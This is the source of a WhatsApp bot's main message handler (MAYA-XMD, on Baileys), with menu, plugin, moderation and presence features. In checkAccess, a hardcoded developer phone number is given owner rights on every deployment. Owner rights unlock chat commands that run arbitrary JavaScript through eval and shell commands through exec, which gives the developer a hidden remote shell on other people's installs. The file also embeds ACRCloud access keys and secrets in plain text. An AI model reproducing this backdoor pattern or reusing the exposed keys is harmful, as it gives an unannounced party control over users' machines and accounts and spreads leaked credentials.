/*
 * Give credits to Kevindev
 * Contact me on +256742932677
 * Coding sounds louder 
 */

require('./start/Core/developer');
const fs = require('fs');
const util = require("util");
const moment = require("moment-timezone");
const path = require('path');
const axios = require('axios')
const devKelvin = '254107065646';
const cheerio = require('cheerio')
const os = require('os');
const { performance } = require("perf_hooks");
const acrcloud = require ('acrcloud');
const lolcatjs = require('lolcatjs');
const timezones = global.timezones || "Africa/Kampala";
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const {
  spawn,
  exec, 
  execSync 
} = require('child_process');

const { 
  default:
  baileys,
  proto, 
  generateWAMessage,
  getDevice,
  generateWAMessageFromContent,
  getContentType, 
  prepareWAMessageMedia
} = require("@whiskeysockets/baileys");
const { 
      smsg,
      formatSize,
      isUrl,
      generateMessageTag,
      getBuffer,
      getSizeMedia,
      runtime,
      fetchJson,
      sleep 
    } = require('./start/lib/myfunction');

const db = require('./start/Core/databaseManager');

const PluginManager = require('./start/lib/PluginManager');

const { 
    handleAntiDelete,
    handleLinkViolation,
    checkAndHandleLinks,
    handleAntiTag,
    handleAntiTagAdmin,
    handleAntiEdit,
    handleMessageStore 
} = require('./start/supreme');

const { handleAutoReact } = require('./start/supremeCmds/autoreact');
const { handleAutoRead } = require('./start/supremeCmds/autoread');
const { handleAutoRecording } = require('./start/supremeCmds/autorecord');
const { handleAutoTyping } = require('./start/supremeCmds/autotyping');
const { handleAIChatbot } = require('./start/supremeCmds/chatbot');

// Default menu image URL (replaced local files)
const DEFAULT_MENU_IMAGE = "https://imgur.com/a/j0adLLV";

//Shazam
const acr = new acrcloud({
    host: 'identify-eu-west-1.acrcloud.com',
    access_key: '882a7ef12dc0dc408f70a2f3f4724340',
    access_secret: 'qVvKAxknV7bUdtxjXS22b5ssvWYxpnVndhy2isXP'
});

// ephoto function 
async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          "Content-Type": "multipart/form-data",
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
 }

 async function saveStatusMessage(m) {
  try {
    if (!m.quoted || m.quoted.chat !== 'status@broadcast') {
      return reply('*Please reply to a status message!*');
    }
    await m.quoted.copyNForward(m.chat, true);
    supreme.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    console.log('Status saved successfully!');
  } catch (error) {
    console.error('Failed to save status message:', error);
    reply(`Error: ${error.message}`);
  }
}

// Function to fetch MP3 download URL
async function fetchMp3DownloadUrl(link) {
  const fetchDownloadUrl1 = async (videoUrl) => {
    const apiUrl = `https://api.nekolabs.my.id/downloader/youtube/play/v1?q=${encodeURIComponent(videoUrl)}`;
    try {
      const response = await axios.get(apiUrl);
      if (response.status !== 200 || !response.data.success) {
        throw new Error('Failed to fetch from NekoLabs API');
      }
      return response.data.result.downloadUrl;
    } catch (error) {
      console.error('Error with NekoLabs API:', error.message);
      throw error;
    }
  };
 
  try {
    const downloadUrl = await fetchDownloadUrl1(link);
    return downloadUrl;
  } catch (error) {
    console.error('Failed to fetch MP3 download URL:', error);
    throw error;
  }
}  

// Active Users Tracking Functions
async function addUserMessage(supreme, groupJid, userJid) {
    try {
        // Get bot number from connection
        const botNumber = await supreme.decodeJid(supreme.user.id);
        
        // Get current active users from SQLite
        let activeUsers = await db.get(botNumber, `active_${groupJid}`, {});
        
        // Initialize or update user
        if (!activeUsers[userJid]) {
            activeUsers[userJid] = {
                count: 0,
                lastActive: Date.now()
            };
        }
        
        // Increment count
        activeUsers[userJid].count++;
        activeUsers[userJid].lastActive = Date.now();
        
        // Save back to SQLite
        await db.set(botNumber, `active_${groupJid}`, activeUsers);
        
        return true;
    } catch (error) {
        console.error('Error in addUserMessage:', error);
        return false;
    }
}

async function getActiveUsers(supreme, groupJid, limit = 10) {
    try {
        const botNumber = await supreme.decodeJid(supreme.user.id);
        const activeUsers = await db.get(botNumber, `active_${groupJid}`, {});
        
        return Object.entries(activeUsers)
            .map(([jid, data]) => ({
                jid: jid,
                count: data.count,
                lastActive: data.lastActive
            }))
            .sort((a, b) => b.count - a.count)
            .slice(0, limit);
    } catch (error) {
        console.error('Error in getActiveUsers:', error);
        return [];
    }
}

async function clearActiveUsers(supreme, groupJid = null) {
    try {
        const botNumber = await supreme.decodeJid(supreme.user.id);
        
        if (groupJid) {
            // Clear specific group
            await db.set(botNumber, `active_${groupJid}`, {});
        } else {
            console.log('Clearing all groups not supported - would need key enumeration');
        }
        return true;
    } catch (error) {
        console.error('Error clearing active users:', error);
        return false;
    }
}

async function getInactiveUsers(supreme, groupJid, allParticipants) {
    try {
        const botNumber = await supreme.decodeJid(supreme.user.id);
        
        // Get active users from database
        const activeUsers = await db.get(botNumber, `active_${groupJid}`, {});
        
        const activeJids = Object.keys(activeUsers);
        const inactiveUsers = allParticipants.filter(jid => !activeJids.includes(jid));
        
        return inactiveUsers;
    } catch (error) {
        console.error('Error getting inactive users:', error);
        return allParticipants || [];
    }
}

module.exports = client = async (supreme, m, chatUpdate, store) => {
  try {
    const body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
      m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
                                         m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
                                         m.text : ""
    );
    
const botNumber = await supreme.decodeJid(supreme.user.id);

let prefix = "."; // Default prefix

try {
    // Get prefix from SQLite
    prefix = await db.get(botNumber, 'prefix', '.');
} catch (error) {
    console.error('Error loading prefix from database:', error);
    prefix = "."; // Fallback to default
}

try {
    const alwaysonlineSetting = await db.get(botNumber, 'alwaysonline', false);
    
    // Handle different possible values
    if (typeof alwaysonlineSetting === 'boolean') {
        global.alwaysonline = alwaysonlineSetting;
    } else if (typeof alwaysonlineSetting === 'string') {
        global.alwaysonline = alwaysonlineSetting.toLowerCase() === 'true';
    } else {
        global.alwaysonline = false; // Fallback
    }
} catch (error) {
    console.error('Error loading alwaysonline from database:', error);
    global.alwaysonline = false; // Default fallback
}

const isCmd = body && typeof body === 'string' && body.startsWith(prefix);
const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";
const command = isCmd && trimmedBody ? trimmedBody.split(/\s+/).shift().toLowerCase() : "";
const args = isCmd ? body.slice(prefix.length).trim().split(/\s+/).slice(1) : [];
const text = args.join(" ");
    
    const sender = m.key.fromMe ? supreme.user.id.split(":")[0] + "@s.whatsapp.net" || supreme.user.id : m.key.participant || m.key.remoteJid;
    const senderNumber = sender.split('@')[0];
    const budy = (typeof m.text === 'string' ? m.text : '');
    
    const from = m.key.remoteJid;
    const senderId = m.key.participant || from;
// database 
    const isGroup = from.endsWith("@g.us");
    

async function checkAccess(sender) {
    try {
        // Normalize the sender number
        const normalizedSender = sender.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        
        const sudoUsers = await db.getSudo(botNumber) || [];
        
        // Get owners from database
        const owners = await db.get(botNumber, 'owners', []);
        
        // Create array of all authorized numbers (normalized)
        const authorizedNumbers = [
            botNumber,
            devKelvin,
            ...owners,
            ...sudoUsers
        ]
        .filter(num => num)
        .map(num => {
            if (!num) return null;
            const cleanNum = num.replace(/[^0-9]/g, "");
            return cleanNum ? cleanNum + "@s.whatsapp.net" : null;
        })
        .filter(num => num);
        
        // Check if sender is in authorized list
        return authorizedNumbers.includes(normalizedSender);
    } catch (error) {
        console.error('Error in checkAccess:', error);
        return false;
    }
}
const Access = await checkAccess(m.sender);

    const pushname = m.pushName || "No Name";
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';
    const qmsg = (quoted.msg || quoted);
    const isMedia = /image|video|sticker|audio/.test(mime);

  async function isAdminSupreme(supreme, chatId, senderId) {
        try {
            const groupMetadata = await supreme.groupMetadata(chatId);
            
            const botId = supreme.user.id.split(':')[0] + '@s.whatsapp.net';
            
            const participant = groupMetadata.participants.find(p => 
                p.id === senderId || 
                p.id === senderId.replace('@s.whatsapp.net', '@lid') ||
                p.id === senderId.replace('@lid', '@s.whatsapp.net')
            );
            
            const bot = groupMetadata.participants.find(p => 
                p.id === botId || 
                p.id === botId.replace('@s.whatsapp.net', '@lid')
            );
            
            const isBotAdmin = bot && (bot.admin === 'admin' || bot.admin === 'smileadmin');
            const isSenderAdmin = participant && (participant.admin === 'admin' || participant.admin === 'smileadmin');

            if (!bot) {
                return { isSenderAdmin, isBotAdmin: true };
            }

            return { isSenderAdmin, isBotAdmin };
        } catch (error) {
            console.error('Error in isAdmin:', error);
            return { isSenderAdmin: false, isBotAdmin: false };
        }
}

// calculate admin status 
let isSenderAdmin = false;
let isBotAdmin = false;

if (isGroup && m.sender) {
    try {
        const adminResult = await isAdminSupreme(supreme, from, senderId);
        isSenderAdmin = adminResult.isSenderAdmin;
        isBotAdmin = adminResult.isBotAdmin;
        
    } catch (error) {
        console.error('Error checking admin status:', error);
        isSenderAdmin = false;
        isBotAdmin = false;
    }
}

    let groupMetadata = null
if (isGroup) {
  try {
    groupMetadata = await supreme.groupMetadata(m.chat)
  } catch (e) {
    console.log("Failed to get group metadata")
  }
}

const groupName = isGroup && groupMetadata ? groupMetadata.subject : ""
const participants = isGroup && groupMetadata ? groupMetadata.participants : []

const groupAdmins = participants
  .filter(p => p.admin)
  .map(p => p.id)

const groupMembers = participants

const groupOwner = groupMetadata?.owner || groupAdmins[0] || null

const isAdmin = isGroup ? groupAdmins.includes(m.sender) : false


if (m.message && !m.message.protocolMessage) {
        handleMessageStore(m);
    }
    
  
    if (m.message?.protocolMessage?.type === 0) {
        console.log('[System] Delete event detected');
        await handleAntiDelete(m, supreme);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoReact(m, supreme).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoRead(m, supreme).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoRecording(m, supreme).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoTyping(m, supreme).catch(console.error);
    }
    
   if (m.message?.protocolMessage?.editedMessage) {
    await handleAntiEdit(m, supreme);
} 

   if (m.isGroup && body && !m.key.fromMe) {
    await checkAndHandleLinks(supreme, {
        key: m.key,
        message: m.message
    },  botNumber); 
}

if (m.isGroup && m.message && !m.key.fromMe) {
    // Check if message has mentions
    const mentionedUsers = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentionedUsers.length > 0) {
        await handleAntiTag(m, supreme);
    }
} 

if (m.isGroup && body) {
    await handleAntiTagAdmin(supreme, {
        chat: m.chat,
        sender: m.sender,
        message: m.message,
        key: m.key,
        isGroup: true,
        pushName: m.pushName || ''
    });
}

 if ((m.mtype || '').includes("groupStatusMentionMessage") && m.isGroup) {
    if (!m.isAdmin && !Access) {
        try {
            
            await supreme.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender
                }
            });
            console.log(`✅ Deleted status mention from ${m.sender}`);
        } catch (error) {
            console.log('❌ Failed to delete status mention:', error);
        }
    }
}

// Apply alwaysonline setting
if (global.alwaysonline === true || global.alwaysonline === 'true') {
    if (m.message && !m.key.fromMe) {
        try {
            await supreme.sendPresenceUpdate("available", from);
            await sleep(1000);
        } catch (error) {
            // Silently handle error
        }
    }
} else {
    // Default behavior - send unavailable presence
    if (m.message && !m.key.fromMe) {
        try {
            await supreme.sendPresenceUpdate("unavailable", from);
            await sleep(1000);
        } catch (error) {
            // Silently handle error
        }
    }
}

    await handleAIChatbot(m, supreme, body, from, isGroup, botNumber, isCmd, prefix);
    
    const time = moment.tz("Asia/Makassar").format("HH:mm:ss");
    
    //================== [ CONSOLE LOG] ==================//
    const timezones = "Asia/Makassar"; 
    const dayz = moment(Date.now()).tz(timezones).locale('en').format('dddd');
    const timez = moment(Date.now()).tz(timezones).locale('en').format('HH:mm:ss z');
    const datez = moment(Date.now()).tz(timezones).format("DD/MM/YYYY");

    if (m.message) {
      lolcatjs.fromString(`┏━━━━━━━━━━━━━『  ＭＡＹＡ - ＸＭＤ  』━━━━━━━━━━━━━─`);
      lolcatjs.fromString(`»  Sent Time: ${dayz}, ${timez}`);
      lolcatjs.fromString(`»  Date: ${datez}`);
      lolcatjs.fromString(`»  Message Type: ${m.mtype || 'N/A'}`);
      lolcatjs.fromString(`»  Sender Name: ${pushname || 'N/A'}`);
      lolcatjs.fromString(`»  Chat ID: ${m.chat?.split('@')[0] || 'N/A'}`);
      
      if (isGroup) {
        lolcatjs.fromString(`»  Group: ${groupName || 'N/A'}`);
        lolcatjs.fromString(`»  Group JID: ${m.chat?.split('@')[0] || 'N/A'}`);
      }
      
      lolcatjs.fromString(`»  Message: ${budy || 'N/A'}`);
      lolcatjs.fromString('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n');
    }
    //<================================================>//
  
    // Create context object for plugins
    const reply = (text) => m.reply(text);
    
const context = {
    supreme,
    m,
    reply,
    store,
    prefix,
    command,
    args,
    acr,
    text,
    trimmedBody,
    isCmd,
    sender,
    senderNumber,
    pushname,
    Access,
    db,
    getInactiveUsers,
    getActiveUsers,
    addUserMessage,
    isCreator: Access,
    isGroup,
    groupName,
    groupMetadata,
    participants,
    isBotAdmin,
    isSenderAdmin,
    quoted,
    saveStatusMessage,
    fetchMp3DownloadUrl,
    mime,
    qmsg,
    isMedia,
    body: budy,
    botNumber,
    from,
    ephoto,
    sleep,
    fetchJson,
    getBuffer,
    getDevice,
    formatSize,
    timezones,
    isUrl,
    runtime,
    match: command,
    mess: global.mess,
    global: global,
    mentionedJid: m.mentionedJid || [],
    pluginManager: global.pluginManager
};
    
const formatMemory = (memory) => {
    return memory < 1024 * 1024 * 1024
        ? Math.round(memory / 1024 / 1024) + ' MB'
        : Math.round(memory / 1024 / 1024 / 1024) + ' GB';
};

const progressBar = (used, total, size = 6) => {
    let percentage = Math.round((used / total) * size);
    let bar = '█'.repeat(percentage) + '░'.repeat(size - percentage);
    return `[${bar}] ${Math.round((used / total) * 100)}%`;
};

const mode = await db.get(botNumber, 'mode', 'public');

const generateMenu = (plugins, ownername, prefixz, modeStatus, versions, latensie, readmore) => {
    const memoryUsage = process.memoryUsage();
    const botUsedMemory = memoryUsage.heapUsed;
    const totalMemory = os.totalmem();
    const systemUsedMemory = totalMemory - os.freemem();

    // Count total unique commands across all plugins
    let totalCommands = 0;
    const uniqueCommands = new Set();
    for (const category in plugins) {
        plugins[category].forEach(plugin => {
            if (plugin.command && plugin.command.length > 0) {
                uniqueCommands.add(plugin.command[0]); 
            }
        });
    }
    totalCommands = uniqueCommands.size;

    let menu = `╭━━━☢︎︎*☆ＭＡＹＡ - ＸＭＤ☆*☢︎︎━━━❍\n`;
    menu += `┃❍│▸  ᴜsᴇʀ: ${ownername}\n`;
    menu += `┃❍│▸ ʙᴏᴛ: ${global.botname}\n`;
    menu += `┃❍│▸ ᴍᴏᴅᴇ: ${mode === 'public' ? 'ᴘᴜʙʟɪᴄ' : 'ᴘʀɪᴠᴀᴛᴇ'}\n`;
    menu += `┃❍│▸ ᴘʀᴇғɪx: [ ${prefixz} ]\n`;
    menu += `┃❍│▸ ᴄᴍᴅs: ${totalCommands}+\n`;
    menu += `┃❍│▸ ᴠᴇʀsɪᴏɴ: ${versions}\n`;
    menu += `┃❍│▸ sᴘᴇᴇᴅ: ${latensie.toFixed(4)} ms\n`;
    menu += `┃❍│▸ 𝚁𝙰𝙼: ${progressBar(systemUsedMemory, totalMemory)}\n`;
    menu += `┃❍│▸ ᴅᴇᴠ: ☘ Ｍｒ Ｓｍｉｌｅ ☘\n`;
  menu += `  ╰━━━━━━━━━━━━━━━❍ `;
    menu += `${readmore}\n`;
    
    for (const category in plugins) {
        menu += `╭━━━☢︎︎*☆ *${category.toUpperCase()} MENU* ☆*☢︎︎━━━❍\n`;
        plugins[category].forEach(plugin => {
            if (plugin.command && plugin.command.length > 0) {
                menu += `┃❍│ ${plugin.command[0]}\n`;
            }
        });
        menu += `╰━━━━━━━━━━━━━━━❍\n\n`;
    }
    return menu;
};

const loadMenuPlugins = (directory) => {
    const plugins = {};
    
    if (!fs.existsSync(directory)) {
        console.error(`Directory ${directory} does not exist`);
        return plugins;
    }

    const files = fs.readdirSync(directory);
    files.forEach(file => {
        if (file.endsWith('.js')) {
            const filePath = path.join(directory, file);
            try {
                delete require.cache[require.resolve(filePath)];
                const pluginModule = require(filePath);
                
                // Handle both array and object exports
                const pluginArray = Array.isArray(pluginModule) ? pluginModule : [pluginModule];
                
                const category = path.basename(file, '.js');
                if (!plugins[category]) {
                    plugins[category] = [];
                }
                
                plugins[category].push(...pluginArray);
            } catch (error) {
                console.error(`Error loading plugin at ${filePath}:`, error);
            }
        }
    });

    return plugins;
};

    // Handle commands via plugin system
    if (isCmd && command) {
        const result = await global.pluginManager.executeCommand(context, command);
        
        if (!result.found) {
            switch (command) {
                case 'menu': {
    const startTime = performance.now();
    await m.reply("*Loading menu*...");
    const endTime = performance.now();
    const latensie = endTime - startTime;
    
    // Get ownername here
    const ownername = await db.get(botNumber, 'ownername', 'Not set');
    const prefixz = prefix;  
    const modeStatus = "online";
    const versions = `${global.versions}`; 
    
    // Load plugins
    const pluginsDir = path.join(__dirname, 'Plugins'); 
    const plugins = loadMenuPlugins(pluginsDir);
    
    // Generate menu text
    const menulist = generateMenu(plugins, ownername, prefixz, modeStatus, versions, latensie, readmore);
    
    // Send menu with default image URL
    await supreme.sendMessage(m.chat, {
        image: { url: DEFAULT_MENU_IMAGE },
        caption: menulist,
    }, { quoted: m });
    break;
}
                
                case 'reloadplugins': {
                    if (!Access) return reply('Owner only command!');
                    try {
                        const pluginsDir = path.join(__dirname, 'Plugins');
                        const count = global.pluginManager.reloadPlugins(pluginsDir);
                        reply(`✅ Reloaded ${count} plugins successfully!`);
                    } catch (error) {
                        reply(` Failed to reload plugins: ${error.message}`);
                    }
                    break;
                }
                
                case 'plugins': {
                    if (!Access) return reply('Owner only command!');
                    const plugins = global.pluginManager.getAllPlugins();
                    let pluginList = '*LOADED PLUGINS*\n\n';
                    
                    for (const [category, pluginArray] of Object.entries(plugins)) {
                        pluginList += `*${category.toUpperCase()}*:\n`;
                        pluginArray.forEach(plugin => {
                            pluginList += `• ${plugin.command[0]}`;
                            if (plugin.command.length > 1) {
                                pluginList += ` (${plugin.command.slice(1).join(', ')})`;
                            }
                            pluginList += '\n';
                        });
                        pluginList += '\n';
                    }
                    
                    reply(pluginList);
                    break;
                }
                
                default: {
                    // Handle eval/exec commands (owner only)
                    if (budy.startsWith('>')) {
                        if (!Access) return;
                        try {
                            let evaled = await eval(budy.slice(2));
                            if (typeof evaled !== 'string') evaled = util.inspect(evaled);
                            await m.reply(evaled);
                        } catch (err) {
                            m.reply(String(err));
                        }
                    }
                        
                    if (budy.startsWith('<')) {
                        if (!Access) return;
                        let kode = budy.trim().split(/ +/)[0];
                        let teks;
                        try {
                            teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${text}})()`);
                        } catch (e) {
                            teks = e;
                        } finally {
                            await m.reply(util.format(teks));
                        }
                    }

                    if (budy.startsWith('-')) {
                        if (!Access) return;         
                        if (text == "rm -rf *") return m.reply("😹");
                        exec(budy.slice(2), (err, stdout) => {
                            if (err) return m.reply(`${err}`);
                            if (stdout) return m.reply(stdout);
                        });
                    }
                    
               
                }
            }
        } else if (!result.success) {
            // Command found but errored
            reply(`Error executing ${command}: ${result.error}`);
        }
    }
    
  } catch (err) {
    console.log(util.format(err));
  }
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});
